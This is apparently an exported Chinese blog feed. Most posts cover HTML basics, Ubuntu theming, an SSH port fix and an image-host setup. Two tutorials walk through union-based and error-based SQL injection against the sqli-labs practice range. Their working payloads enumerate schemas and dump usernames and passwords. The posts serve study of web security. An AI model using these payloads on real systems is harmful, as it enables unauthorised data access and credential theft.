class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202301141135495.jpg"></p><h3 id="无序和有序，自定义排序标签"><a href="#无序和有序，自定义排序标签" class="headerlink" title="无序和有序，自定义排序标签"></a>无序和有序，自定义排序标签</h3><table><thead><tr><th>标签</th><th>作用</th><th align="center">属性值</th><th></th></tr></thead><tbody><tr><td>&lt;ur</td><td>无序标签</td><td align="center">&lt;ul  type&#x3D;”disc” “circle” “square”    <strong>解释:<strong>disc 实心圆; circle:空心圆 square: 实心方块。默认是disc 。</strong>子级：&lt;li</strong></td><td><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202301141423184.jpg" style="zoom:25%;" /></td></tr><tr><td>&lt;ol</td><td>有序标签</td><td align="center">&lt;ur type&#x3D;”1” “a” “A” “I” “i”  start&#x3D;””   <strong>解释:</strong> start:规定有序列表的起始值.<strong>子集：&lt;li</strong></td><td><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202301141438085.jpg" style="zoom:25%;" /></td></tr><tr><td>&lt;dt</td><td>自定义序列</td><td align="center">子集有两个分别是&lt;dt &lt;dd 。 两个子标签更像用来一问一答。</td><td><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202301141449365.jpg" style="zoom:25%;" /></td></tr></tbody></table><h2 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h2><table><thead><tr><th>标签</th><th align="left">作用</th><th>属性值</th><th align="center">子标签</th><th></th></tr></thead><tbody><tr><td>table</td><td align="left">创建一个表格</td><td>table border&#x3D;” “  cellspacing&#x3D;“” 解释:border 定义表格宽度 ； cellspacing：规定单元格之间的空白。 <u>更多属性自行查阅</u></td><td align="center">tr 元素定义表格行，th 元素定义表头，td 元素定义表格单元</td><td><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202301141506681.jpg" style="zoom:25%;" /></td></tr><tr><td>rowspan</td><td align="left">纵向合并单元格</td><td>rowspan&#x3D;”4” 表示纵向合并四个单元格</td><td align="center"></td><td></td></tr><tr><td>colspan</td><td align="left">横向合并单元格</td><td>colspan&#x3D;”7” 表示横向合并7个单元格</td><td align="center"></td><td></td></tr></tbody></table><h2 id="表单"><a href="#表单" class="headerlink" title="表单"></a>表单</h2><table><thead><tr><th>标签</th><th>作用</th><th>属性值</th><th></th></tr></thead><tbody><tr><td>form</td><td>定义一个表单</td><td>form action&#x3D;”” menth&#x3D;”post”  <strong>解释：****ation</strong>:向何处提交表单，可以是页面和url。<strong>menth:</strong> 提交方式有post 和get两种提交方式。</td><td></td></tr><tr><td>input</td><td>输入标签：可作为form子标签使用</td><td>type&#x3D;””   input的工作方式取决于type的类型。type的值：text,password,date,submit,color,image <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/Input">详细可参观考</a></td><td></td></tr><tr><td>select</td><td>选择标签</td><td>name&#x3D;””  multiple size&#x3D;”2”  selected name提交给服务器的id  multipel: 没有声明该值时一次选择一个 size: 选择的值        option子标签  value&#x3D;”” 里面的值    selected 默认选择的值</td><td></td></tr><tr><td>textarea</td><td>文本元素</td><td>cols&#x3D;”30” rows&#x3D;”10”  cols:列数 rows: 行数</td><td><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202301211608344.jpg" style="zoom:25%;" /></td></tr><tr><td>fieldset</td><td>加个边框</td><td>子标签: legend 给这个边框添加个标题</td><td><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202301211622783.jpg" style="zoom:25%;" /></td></tr></tbody></table><table><thead><tr><th align="left">input 标签 type 所对应值的用法</th><th></th><th></th><th></th></tr></thead><tbody><tr><td align="left">type&#x3D;”text” placeholder&#x3D;“请输入”  placeholder:占位文本,可用来提醒用户的输入</td><td>文本样式</td><td><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202301192058526.jpg" style="zoom:25%;" /></td><td></td></tr><tr><td align="left">type&#x3D;”file” accept&#x3D; “video&#x2F;*”   audio&#x2F;*表示音频文件 ,video&#x2F;表示视频文件 ,image&#x2F; 表示图片文件</td><td>文件上传</td><td></td><td></td></tr><tr><td align="left"></td><td></td><td></td><td></td></tr><tr><td align="left">type&#x3D;”password”</td><td>输入时为不可见形式</td><td></td><td></td></tr><tr><td align="left">type&#x3D;”submit” value&#x3D;”上传” 可更改value来改变文字</td><td>提交按钮</td><td><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202301192104899.jpg" style="zoom:25%;" /></td><td></td></tr><tr><td align="left">type&#x3D;”image” src&#x3D;” “ alt</td><td>带图像的 submit 按钮。显示的图像由 src 属性规定。如果 src 缺失，alt 属性就会显示</td><td><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202301192113847.jpg" style="zoom:25%;" /></td><td></td></tr><tr><td align="left">type&#x3D;”color” name&#x3D;”head” value&#x3D;””</td><td>颜色控件</td><td></td><td></td></tr><tr><td align="left">type&#x3D;”checkbox” chedked&#x3D;”checked”</td><td>复选框</td><td></td><td></td></tr><tr><td align="left">type&#x3D;”rideo” name&#x3D;”boy” “checked&#x3D;”checked” 当name的名字一样时会出现互斥 checked: 默认选中 当两个标签中都有checked 网页自上而下解析 发现第一个标签中有checked 接着解释第二个表现也有checked所以会选择第二个checked。</td><td>单选框</td><td><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202301211544573.jpg" style="zoom:25%;" /></td><td></td></tr></tbody></table><h2 id="超链接"><a href="#超链接" class="headerlink" title="超链接"></a>超链接</h2><table><thead><tr><th>超链接标签 href</th><th></th></tr></thead><tbody><tr><td>链接到一个url 上</td><td>a href&#x3D;”URL”</td></tr><tr><td>链接到一个图片上面</td><td>a href&#x3D;”URL”   img src&#x3D;”.&#x2F;xxx&#x2F;“ alt&#x3D;” “ &#x2F;a</td></tr><tr><td>链接到当前的某个页面</td><td>使用锚点 在该段落前添加id属性 再用href&#x3D;”#xx” 进行连接 <a href="https://www.w3schools.com/tags/att_a_href.asp">参考</a></td></tr></tbody></table><h2 id="音频和视频标签"><a href="#音频和视频标签" class="headerlink" title="音频和视频标签"></a>音频和视频标签</h2><table><thead><tr><th>标签</th><th>属性</th><th></th></tr></thead><tbody><tr><td>video 视频标签</td><td>autoplay loop controls 自动播放,循环播放，显示控件 src 引入的视频。也可以使用子标签source src type&#x3D;”video.mp4”</td><td><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202301231107119.jpg" style="zoom:25%;" /></td></tr><tr><td>audio 音频标签</td><td>和上述一样</td><td><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202301231107119.jpg" style="zoom:25%;" /></td></tr><tr><td>source</td><td>用于为媒体元素指定多种媒体资源</td><td></td></tr></tbody></table><p>ps: 如果嫌一个个打太慢了 ，hbuilde 内置了emmet插件可以便捷完成一些操作。<a href="https://docs.emmet.io/">官方文档</a>  。</p><p>[^1.相对路径]: 相对路径是一段不完整的路径。例如：.&#x2F;xxxx&#x2F;xxx&#x2F;xxx.jpg      .&#x2F;表示当前目录  ..&#x2F;表示上一级目录<br>[^2.绝对目录]: 一段完整的路径  例如：<a href="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202301012218787.png">https://xdm-blog.oss-cn-beijing.aliyuncs.com/202301012218787.png</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入——联合注入</title>
      <link href="/2022/12/25/sql%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/"/>
      <url>/2022/12/25/sql%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="前言：今天学习了下sql注入中的联合注入，特写下此文章。靶场是sqli-labs-1"><a href="#前言：今天学习了下sql注入中的联合注入，特写下此文章。靶场是sqli-labs-1" class="headerlink" title="前言：今天学习了下sql注入中的联合注入，特写下此文章。靶场是sqli-labs 1"></a>前言：今天学习了下sql注入中的联合注入，特写下此文章。靶场是sqli-labs 1</h1><h2 id="mysql基础知识："><a href="#mysql基础知识：" class="headerlink" title="mysql基础知识："></a>mysql基础知识：</h2><p>2.sehemata:中存储该用户创建的所有数据库的库名，只需要记住该表中纪录数据库的库名字段schema_nmae<br>3.tables: 用户创建的所有数库据的库名和表名。记录数据库的库名和表名字段为 table_schema,table_nmae<br>4.colmuns 所有的库名，表名，字段名。 记录数据库的库名，表名，字段名的字段名为 table_schema, table_nmae,column_nmae</p><h3 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h3><ol><li>判断注入类型</li></ol>  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>  <img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202212251823740.jpg"><br>  报错了，说明该类型是字符型。字符型在进行sql注入需要使用 **’**来闭合语句。   </p><ol start="2"><li>接下来就是确认字段数 这里使用 order by函数。（也可以使用union select null 来确字段数）</li></ol>  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 1--+</span></span><br></pre></td></tr></table></figure><p>  <img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202212251828569.jpg"><br>  页面返回正常。为了节省时间一步步测试就不展示了。  </p>  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 4--+</span></span><br></pre></td></tr></table></figure><p>  <img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202212251830486.jpg"><br>  页面返回异常说明，该字段数为3. 所以union注入语句如下: union select 1,2,3<br>  我们通过更改id的参数让服务器返回 union select的结果。这里把id的参数改为-1因为数据库没有id&#x3D;-1的数据。就可以返回union select的结果。  </p><p>3.确认了字段数接来下就在union select 1,2,3上面进行查询想要的数据.<br>查询数据库名.   </p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,database(),3--+</span></span><br></pre></td></tr></table></figure><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202212251837635.jpg"><br>查询的数据库名为:<strong>security</strong>.</p><p>4.获取了数据库名接下来就是表名。(group_concat():对分组的字符串进行连接，在这里使用方便查看所有的表名)  </p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27;  --+</span></span><br></pre></td></tr></table></figure><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202212251851252.jpg"></p><p>5.开始获取字段名  </p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#x27;</span>security<span class="string">&#x27; and table_name=&#x27;</span>users<span class="string">&#x27;  --+</span></span><br></pre></td></tr></table></figure><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202212251858779.jpg"></p><p>6.获取字段的内容</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(concat(0x7e,username,password)),3 from security.users  --+</span></span><br></pre></td></tr></table></figure><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202212251902820.jpg"></p>]]></content>
      
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu22.04美化---macos系统“</title>
      <link href="/2022/11/13/Ubuntu22-04%E7%BE%8E%E5%8C%96-macos%E7%B3%BB%E7%BB%9F%E2%80%9C/"/>
      <url>/2022/11/13/Ubuntu22-04%E7%BE%8E%E5%8C%96-macos%E7%B3%BB%E7%BB%9F%E2%80%9C/</url>
      
        <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>ubuntu系统的原始界面并不是很好看,就有了系统美化这一操作。我在写这个文章时使用的Ubuntu 22.04版本，在网上的很多教程当中都使用的火狐浏览器，之前看一个博主说过这个snap包并不支持这个版本自带的火狐浏览器，要下载debian版本的火狐浏览器可以解决，也可以使用谷歌浏览器。<br>美化好的样子<br><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202211131851726.jpg">   </p><h1 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h1><p> 1.先去<a href="https://ubuntu.com/">ubuntu官网</a>下载对应的版本.<br> 2.更换为阿里云源，更换为国内源下载速度会快一些。<br> 3.更新软件包：sudo apt update &amp;&amp; sudo apt upgrade<br> 4.安装插件支持shell扩展(这安装的是两个东西) sudo apt install gnome-tweaks gnome-shell-extensions -y<br> 5.打开谷歌浏览器输入 extensions.gnome.org 安装扩展。<br> 6.去github下载<a href="https://github.com/vinceliuice/WhiteSur-gtk-theme">macos主题</a>,下载好之后进入当前目录,ls查看一下会发现有个.&#x2F;install.sh安装程序脚本,这是一个默认的主题详细的可以去看他的介绍可以选择多种样式的。我这里使用的参数是.&#x2F;isntall -t all -N glassy -s 220<br> 7.&#x2F;tweaks.sh -g . 这个tweaks，是个优化程序来设置主题和图标<br> <img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202211131953288.jpg"><br> 8.下载<a href="https://www.gnome-look.org/p/1400021">macos图标</a> 下载完之后是一个压缩包,把他解压到一个以.开头的文件这样文件就可以隐藏起来了。<br> 9.打开tweaks 开始选择用用程序和图标。<br> <img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202211132002905.jpg"><br> 10.打开谷歌浏览器的gnome插件开始安装,一些扩展插件来使他更像macos<br> 这里是我使用的插件,也可以在里面看一些其他的插件.要管理这些插件可以搜索extensions<br> <img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202211132019013.jpg">   </p><h1 id="ps"><a href="#ps" class="headerlink" title="ps:"></a>ps:</h1><p> <strong>如果你的shell显示的是一个三角形里面有个感叹号，那么在后来的gnome插件安装中可能失败不会出现任何的安装提示。我在第一安装时就出现了这个问题之后在gnome里安装扩展插件没有安装的提示弹窗，猜测可能是本机的shell扩展没有安装好无法和浏览器插件进行连接</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> 其他 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入--报错注入攻击</title>
      <link href="/2022/10/26/sql%E6%B3%A8%E5%85%A5-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/"/>
      <url>/2022/10/26/sql%E6%B3%A8%E5%85%A5-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="sql报错注入攻击原理"><a href="#sql报错注入攻击原理" class="headerlink" title="sql报错注入攻击原理"></a>sql报错注入攻击原理</h1><p>利用一些特殊的函数来使mysql数据库进行报错。例如：extractvalue()，updatamxl(),floor(),exp() ….</p><h1 id="extractvalue-函数"><a href="#extractvalue-函数" class="headerlink" title="extractvalue()函数"></a>extractvalue()函数</h1><p>语法：extractvalue(xml_frag, xpath_expr)<br>第一参数：xml文档对象的名称，是一个string类型。<br>第二个参数：使用xpath语法格式的路径。<br>当使用extractvalue(xml_frag, xpath_expr)函数时，若xpath_expr参数不符合xpath格式，就会报错. extractvalue是一个xml文档查询函数<br>构造一个错误的语法: select extractvalue(1,concat(0x7e,(select database()))<br>爆出了数据库名:deelmind 0x7e：十六进制转码后就是 ~ 因为在xpath中这是一个错误的格式<br><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202211071035837.jpg" alt="图片alt" title="图片title"><br>这里的concat()是拼接函数把两个字符串拼接起来。<br><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202211071035005.jpg">  </p><h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><p>了解原理之后就打开sql注入靶场进行测试<br>1.判断注入点 admin’ and 1&#x3D;1#<br><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202211071036211.jpg"><br>admin’ and 1&#x3D;2# 出现错误 有注入点<br><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202211071037029.jpg"><br>2.开始构造payload: admin’ and extractvalue(1,concat(0x7e,(select database())))#  得到数据库名：security<br><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202211071038001.jpg"><br>接下来就是表 admin’ and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’)))#  得出表名：emails,referers,uagents,users<br>group_concat函数的作用把重复的字段打印到一起<br><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202211071041755.jpg"><br>在得出字段名 admin’ and extractvalue(1,concat(0x7e,(select group_concat(username,0x7e,password) from users)))#<br><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202211071036321.jpg">  </p><h1 id="floor函数"><a href="#floor函数" class="headerlink" title="floor函数"></a>floor函数</h1><p>floor函数需要配合 count(),group by()函数使用  </p><h2 id="报错原理"><a href="#报错原理" class="headerlink" title="报错原理"></a>报错原理</h2><p>floor报错的原理是rand和order by或group by的冲突。 会生成一个重复的主键，这在mysql属于错误的。<br>rand():生成一个随机的0-1的数值 rand(0)*2:把数值乘2 变成 0-2<br><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202211071044769.jpg"><br><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202211071044790.jpg"><br>为了更加直观的显示出来 就需要 floor这个函数，作用是向下取整<br><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202211071044813.jpg"><br><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202211071044839.jpg"><br>group by 函数就是把数据弄成一个分组，需要和 count()函数连用 这个是统计返回的值。举个列子<br><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202211071044874.jpg"><br>group by group by在执行时，会依次取出查询表中的记录并创建一个临时表，group by的对象便是该临时表的主键。如果临时表中已经存在该主键，则将值加1，如果不存在，则将该主键插入到临时表中，注意是插入<br>rand(0)x2 每次生成的前几个随机数都是 01101…… <strong>group by与rand()使用时，如果临时表中没有该主键，则在插入前rand()会再计算一次。</strong><br>第一次 生成的数是0，由于临时表中没有这个主键所以floor(rand(0)<em>2)重新计算一次结果是1，插入表中。<br>第二次 生成的数是 1，由于临时表中存在该主键 count(</em>)加1.<br>第三次 生成的数是 0 由于没有该主键 在计算一次是 1 将会生成一个主键强行插入进去。<br>就会报错–Duplicate entry ‘1’ for key ‘<group_key>‘<br><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202211071044908.jpg"></p><h1 id="exp-函数"><a href="#exp-函数" class="headerlink" title="exp()函数"></a>exp()函数</h1><h2 id="报错原理-1"><a href="#报错原理-1" class="headerlink" title="报错原理"></a>报错原理</h2><p>exp() 函数返回e的x方,当这个值超过了超过一定范围就会报错。<br><strong>实例</strong>： and exp(~(select * from (select user())a))<br><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202212211620088.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入靶场搭建</title>
      <link href="/2022/10/22/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/"/>
      <url>/2022/10/22/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="sql注入漏洞介绍"><a href="#sql注入漏洞介绍" class="headerlink" title="sql注入漏洞介绍:"></a>sql注入漏洞介绍:</h1><p>简单点说就是用户输入的参数可以带进数据库执行sql语句，恶意攻击者从而可以构建sql语句查询到数据库的内容。<br><em><strong>sql注入满足的两个条件:1.参数用户可控：前端传给后端的参数内容是用户可控的.<br>&#8195;&#8195;&#8195;&#8195;&#8195;&#8195;&#8195;&#8195;&#8195;&#8195;2.参数带入数据库查询：传入的参数拼接到sql语句，且带入数据库查询.</strong></em>  </p><p>sql注入的危害:1.导致数据库信息泄露<br>&#8195;&#8195;&#8195;&#8195;&#8195;&#8195;&#8195;2.网站被挂马，传播恶意软件：修改数据库一些字段的值，嵌入网马链接，进行挂马攻击。<br>&#8195;&#8195;&#8195;&#8195;&#8195;&#8195;&#8195;3.数据库被恶意操作：数据库服务器被攻击，数据库的系统管理员帐户被窜改.<br>&#8195;&#8195;&#8195;&#8195;&#8195;&#8195;&#8195;4.破坏硬盘数据，导致全系统瘫痪;  </p><h2 id="搭建靶场"><a href="#搭建靶场" class="headerlink" title="搭建靶场"></a>搭建靶场</h2><p>搭建好的靶场<br><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202211061100856.jpg" alt="图片alt" title="title"><br>1.下载集成环境，这里我用的<a href="https://www.xp.cn/" title="超链接title">phpstudy</a><br>2.下载<a href="https://github.com/Audi-1/sqli-labs" title="超链接title">sqli-labs</a>。下载好后进行解压，放在phpstudy下的www文件夹下<br><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202211061101679.jpg" alt="图片alt" title="title"><br><em><strong>注意php的版本要低于7以下不然会报错</strong></em><br><br><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202211061100668.jpg" title="title"><br>3.修改phpstudy_pro\WWW\sqli-labs-master\sql-connections下的db-creds.inc文件(相当于让你设置一个连接密码，默认的地址是127.0.0.0)<br><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202211061100842.jpg"><br>4.开启 Apache和mysql数据库<br><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202211061102253.jpg"><br>5.访问<a href="http://127.0.0.1/sqli-labs-master/">http://127.0.0.1/sqli-labs-master/</a><br><br>点击下方如图所示创建数据库<br><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202211061100632.jpg"><br>再次访问 <a href="http://127.0.0.1/sqli-labs/">http://127.0.0.1/sqli-labs/</a> 就创建好了<br>点击第一关如图就可以开始进行练习了.<br><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202211061103747.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于博客,ssh连接不上github仓库问题</title>
      <link href="/2022/10/06/%E5%85%B3%E4%BA%8E%E5%8D%9A%E5%AE%A2-ssh%E8%BF%9E%E6%8E%A5%E4%B8%8D%E4%B8%8Agithub%E4%BB%93%E5%BA%93%E9%97%AE%E9%A2%98/"/>
      <url>/2022/10/06/%E5%85%B3%E4%BA%8E%E5%8D%9A%E5%AE%A2-ssh%E8%BF%9E%E6%8E%A5%E4%B8%8D%E4%B8%8Agithub%E4%BB%93%E5%BA%93%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="前言：今天在进行github部署时发现ssh连接不了GitHub仓库"><a href="#前言：今天在进行github部署时发现ssh连接不了GitHub仓库" class="headerlink" title="前言：今天在进行github部署时发现ssh连接不了GitHub仓库"></a>前言：今天在进行github部署时发现ssh连接不了GitHub仓库</h1><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202211061029188.jpg" alt="图片alt" title="图片title"><br>根据报错信息来看ssh无法连接github,22端口被拒绝.最开始以为是密匙无效导致无法连接，后来重新生成了一个密匙再进行绑定发现还是无法连接，尝试使用ssh去连接github。发现连接不了。<br><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202211061029672.jpg" alt="图片alt" title="图片title"><br>于是使用了443端口去连接，发现可以连接上<br><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202211061029115.jpg" alt="图片alt" title="图片title"></p><h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>到~&#x2F;.ssh&#x2F;config里进行修改强制，使用443端口进行连接，如果没有config文件就创建一个。在里面添加：<br>Hostgithubcom<br>Hostname ssh.github.com<br>Port 443<br><br> 再次进行连接发现可以连接上去，这时候再重新部署就可部署到仓库上去了<br><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202211061029748.jpg" alt="图片alt" title="图片title"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 其他 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>搭建个人图床</title>
      <link href="/2022/10/01/%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%9B%BE%E5%BA%8A/"/>
      <url>/2022/10/01/%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%9B%BE%E5%BA%8A/</url>
      
        <content type="html"><![CDATA[<h1 id="前言：博客之前使用的图床都是在线图床-URL链接随时都会失效导致图片加载不出来-为了解决这个问题-可以搭建个人图床就避免了以上问题。"><a href="#前言：博客之前使用的图床都是在线图床-URL链接随时都会失效导致图片加载不出来-为了解决这个问题-可以搭建个人图床就避免了以上问题。" class="headerlink" title="前言：博客之前使用的图床都是在线图床,URL链接随时都会失效导致图片加载不出来,为了解决这个问题,可以搭建个人图床就避免了以上问题。"></a>前言：博客之前使用的图床都是在线图床,URL链接随时都会失效导致图片加载不出来,为了解决这个问题,可以搭建个人图床就避免了以上问题。</h1><h2 id="1-下载picgo：https-molunerfinn-com-PicGo"><a href="#1-下载picgo：https-molunerfinn-com-PicGo" class="headerlink" title="1.下载picgo：https://molunerfinn.com/PicGo/"></a>1.下载picgo：<a href="https://molunerfinn.com/PicGo/">https://molunerfinn.com/PicGo/</a></h2><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202211060956138.jpg" alt="图片alt" title="图片title"> <strong>windows 64位</strong><br><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202211061010012.jpg" title="图片title"><br>我这里使用的是github仓库作为储存图片,也可以购买腾讯云的cos作为储存,详细的可以去看picgo的官方文档(<a href="https://picgo.github.io/PicGo-Doc/zh/guide/#%E5%BA%94%E7%94%A8%E6%A6%82%E8%BF%B0">https://picgo.github.io/PicGo-Doc/zh/guide/#%E5%BA%94%E7%94%A8%E6%A6%82%E8%BF%B0</a>)</p><p>接下来就是注册github账号和创建一个仓库–<strong>这里就自行百度</strong>.    创建好后就需要创建一个令牌<br><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202211061010976.jpg"><br>点击设置后再点击 Developer settings<br><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202211061011817.jpg"><br>我这里已经创建了一个<br><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202211061013418.jpg"><br>创建成功后会会显示令牌，<strong>这个令牌只显示一次,一定要先复制好</strong><br><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202211061011314.jpg"><br>接下来就是打开picgo，配置相关的设置<br><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202211061014103.jpg"><br>仓库名:你github的名字加上仓库名。分支就设置为main。 token：刚才保存的一串令牌。到这，个人图床就算搭建好了。上传的图片会保存在你github仓库里进行查看</p>]]></content>
      
      
      
        <tags>
            
            <tag> 其他 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
